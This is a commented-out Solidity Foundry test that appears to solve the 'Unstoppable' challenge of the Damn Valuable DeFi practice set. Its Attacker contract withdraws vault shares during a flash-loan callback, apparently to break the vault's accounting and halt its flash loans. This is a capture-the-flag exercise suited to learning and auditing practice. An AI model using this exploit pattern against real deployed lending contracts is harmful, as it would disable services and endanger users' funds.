/* // SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./ReceiverUnstoppable.sol";
import "./UnstoppableVault.sol";
import "../DamnValuableToken.sol";
import "./UnstoppableVault.sol";

contract Attacker is IERC3156FlashBorrower {
    UnstoppableVault private immutable vault;

    constructor(address _vault) {
        vault = UnstoppableVault(_vault);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        ERC20(token).approve(address(vault), amount);
        vault.withdraw(1 ether, address(this), address(this));
        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function attack(uint256 value) public {
        vault.flashLoan(this, address(vault.asset()), value, bytes(""));
    }
}

contract UnstoppableTest is Test {
    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiver;
    Attacker attacker;
    address owner;
    address player;
    uint256 balance = 1_000_000 ether;

    function setUp() public {
        owner = makeAddr("tinchoabbate");
        player = makeAddr("player");

        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, address(owner), address(owner));

        assertEq(vault.asset() == token, true);

        token.approve(address(vault), balance);
        vault.deposit(balance, owner);

        assertEq(token.balanceOf(address(vault)) == balance, true);
        assertEq(vault.totalAssets() == balance, true);
        assertEq(vault.totalSupply() == balance, true);
        assertEq(vault.maxFlashLoan(address(token)) == balance, true);

        assertEq(vault.flashFee(address(token), balance - 1) == 0, true);
        assertEq(vault.flashFee(address(token), balance) == 50000 ether, true);


        deal(address(token), player, 10 ether);

        assertEq(token.balanceOf(player) == 10 ether, true);

        receiver = new ReceiverUnstoppable(address(vault));

        attacker = new Attacker(address(vault));
    }

    function testAttack() public {
        vm.prank(player, player);
        token.approve(address(vault), 2 ether);
        vm.prank(player, player);
        vault.deposit(2 ether, address(attacker));

        attacker.attack(1 ether);

        receiver.executeFlashLoan(100 ether);
    }
}
 */